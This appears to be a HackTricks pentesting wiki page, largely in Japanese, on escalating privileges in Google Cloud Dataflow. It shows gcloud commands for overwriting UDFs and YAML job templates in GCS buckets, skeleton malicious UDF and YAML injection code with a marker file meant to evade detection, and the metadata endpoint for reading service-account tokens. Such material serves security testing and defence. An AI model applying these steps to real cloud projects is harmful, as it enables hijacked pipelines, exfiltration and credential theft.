# GCP - Dataflow Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### `storage.objects.create`, `storage.objects.get`, `storage.objects.update`

Dataflow は GCS に保存された UDF およびジョブテンプレートの YAML の整合性を検証しません。バケットへの書き込み権限があれば、これらのファイルを書き換えてコードを注入し、workers 上でコードを実行し、service account tokens を窃取したり、データ処理を改ざんしたりできます。batch および streaming pipeline ジョブの両方がこの攻撃の対象になります。パイプラインに対してこの攻撃を実行するには、ジョブ実行前、最初の数分間（job workers が作成される前）またはジョブ実行中に新しい workers がスケールアウトする前（autoscaling による）に UDFs／templates を差し替える必要があります。

**Attack vectors:**
- **UDF hijacking:** パイプラインで参照され、customer-managed バケットに保存された Python (`.py`) および JS (`.js`) の UDFs
- **Job template hijacking:** customer-managed バケットに保存されたカスタム YAML パイプライン定義


> [!WARNING]
> **Run-once-per-worker trick:** Dataflow の UDFs と template callables は **per row/line** ごとに呼び出されます。調整なしでは exfiltration や token theft が何千回も走り、ノイズ、rate limiting、および検出を引き起こします。**file-based coordination** パターンを使用してください: 先頭でマーカーファイル（例: `/tmp/pwnd.txt`）が存在するか確認し、存在する場合は悪意のあるコードをスキップ、存在しない場合はペイロードを実行してファイルを作成します。これによりペイロードは **once per worker**、行ごとではなく一回だけ実行されます。


#### Direct exploitation via gcloud CLI

1. Enumerate Dataflow jobs and locate the template/UDF GCS paths:

<details>

<summary>List jobs and describe to get template path, staging location, and UDF references</summary>
```bash
# List jobs (optionally filter by region)
gcloud dataflow jobs list --region=<region>
gcloud dataflow jobs list --project=<PROJECT_ID>

# Describe a job to get template GCS path, staging location, and any UDF/template references
gcloud dataflow jobs describe <JOB_ID> --region=<region> --full --format="yaml"
# Look for: currentState, createTime, jobMetadata, type (JOB_TYPE_STREAMING or JOB_TYPE_BATCH)
# Pipeline options often include: tempLocation, stagingLocation, templateLocation, or flexTemplateGcsPath
```
</details>

2. GCS から元の UDF またはジョブテンプレートをダウンロードする:

<details>

<summary>bucket から UDF ファイルまたは YAML テンプレートをダウンロードする</summary>
```bash
# If job references a UDF at gs://bucket/path/to/udf.py
gcloud storage cp gs://<BUCKET>/<PATH>/<udf_file>.py ./udf_original.py

# Or for a YAML job template
gcloud storage cp gs://<BUCKET>/<PATH>/<template>.yaml ./template_original.yaml
```
</details>

3. ローカルでファイルを編集する: malicious payloadを注入し（下のPython UDFまたはYAMLスニペットを参照）、run-once coordination patternが使用されていることを確認してください。

4. 再アップロードして元のファイルを上書きする:

<details>

<summary>bucket内のUDFまたはtemplateを上書きする</summary>
```bash
gcloud storage cp ./udf_injected.py gs://<BUCKET>/<PATH>/<udf_file>.py

# Or for YAML
gcloud storage cp ./template_injected.yaml gs://<BUCKET>/<PATH>/<template>.yaml
```
</details>

5. 次のジョブ実行を待つか、（streaming の場合は）autoscaling をトリガーする（例：pipeline の入力を大量に流す）ことで、新しい workers が起動して修正済みファイルを pull します。

#### Python UDF injection

worker にデータを C2 サーバへ exfiltrate させたい場合は、`urllib.request` を使用し、`requests` は使用しないでください。  
`requests` は classic Dataflow workers に preinstalled されていません。

<details>

<summary>単回実行の調整とメタデータ抽出を備えた悪意のある UDF</summary>
```python
import os
import json
import urllib.request
from datetime import datetime

def _malicious_func():
# File-based coordination: run once per worker.
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return

# malicous code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")

def transform(line):
# Malicous code entry point - runs per line but coordination ensures once per worker
try:
_malicious_func()
except Exception:
pass
# ... original UDF logic follows ...
```
</details>


#### Job template YAML injection

`MapToFields` ステップを注入し、調整用のファイルを使う callable を含めます。`requests` をサポートする YAML ベースのパイプラインでは、テンプレートが `dependencies: [requests]` を宣言している場合はそれを使用し、そうでなければ `urllib.request` を優先してください。

パイプラインが宛先に有効なデータを書き続けるように、クリーンアップステップ（`drop: [malicious_step]`）を追加します。

<details>

<summary>パイプライン YAML における悪意ある `MapToFields` ステップとクリーンアップ</summary>
```yaml
- name: MaliciousTransform
type: MapToFields
input: Transform
config:
language: python
fields:
malicious_step:
callable: |
def extract_and_return(row):
import os
import json
from datetime import datetime
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return True
try:
import urllib.request
# malicious code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")
except Exception:
pass
return True
append: true
- name: CleanupTransform
type: MapToFields
input: MaliciousTransform
config:
fields: {}
append: true
drop:
- malicious_step
```
</details>

### Compute Engine から Dataflow Workers へのアクセス

**権限:** `compute.instances.osLogin` または `compute.instances.osAdminLogin`（worker SA に対する `iam.serviceAccounts.actAs` を伴う）、または `compute.instances.setMetadata` / `compute.projects.setCommonInstanceMetadata`（`iam.serviceAccounts.actAs` を伴う） — レガシーな SSH キー注入用

Dataflow workers は Compute Engine の VM として動作します。OS Login または SSH 経由で worker にアクセスすると、メタデータエンドポイント (`http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`) から SA トークンを読み取ったり、データを操作したり、任意のコードを実行したりできます。

エクスプロイトの詳細については、次を参照：
- [GCP - Compute Privesc](gcp-compute-privesc/README.md) — `compute.instances.osLogin`, `compute.instances.osAdminLogin`, `compute.instances.setMetadata`

## 参考資料

- [Dataflow Rider: How Attackers can Abuse Shadow Resources in Google Cloud Dataflow](https://www.varonis.com/blog/dataflow-rider)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [gcloud dataflow jobs describe](https://cloud.google.com/sdk/gcloud/reference/dataflow/jobs/describe)
- [Apache Beam YAML: User-defined functions](https://beam.apache.org/documentation/sdks/yaml-udf/)
- [Apache Beam YAML Transform Reference](https://beam.apache.org/releases/yamldoc/current/)

{{#include ../../../banners/hacktricks-training.md}}
